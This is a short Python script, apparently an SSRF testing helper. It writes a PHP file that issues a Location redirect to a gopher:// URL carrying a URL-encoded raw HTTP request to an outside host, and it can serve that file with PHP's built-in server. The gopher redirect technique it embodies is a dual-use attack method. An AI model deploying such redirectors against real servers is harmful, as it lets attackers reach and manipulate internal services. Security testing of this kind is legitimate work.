import subprocess, hashlib, time, argparse



def filename_format(redirect_payload):
	timestamp = str(time.time()).replace(".", "")
	payload_hash = hashlib.sha256()
	payload_hash.update(bytes(redirect_payload, 'utf-8'))
	return "redirect-{payload_hash}-{timestamp}.php".format(payload_hash=payload_hash.hexdigest(), timestamp=timestamp) 

def write_php_redirect_file(redirect_payload, filename_format_function):
	filename = filename_format_function(redirect_payload)
	print("New filename: ", filename)
	with open(filename, "w") as file_out:
		print("Creating the PHP file")
		contents = '<?php header("Location: {redirect_payload}"); ?>'.format(redirect_payload=redirect_payload)
		file_out.write(contents)
	return filename

def start_php_server(ip, port):
	subprocess.run(["php", "-S", ip+":"+port])	

def main():
	# start_php_server('0.0.0.0', '8001')
	new_file = write_php_redirect_file("gopher://jacobsandum.com:8000/_GET /gopher HTTP/1.0%0A%0A", filename_format)
	print(new_file)

if __name__ == "__main__":
    main()
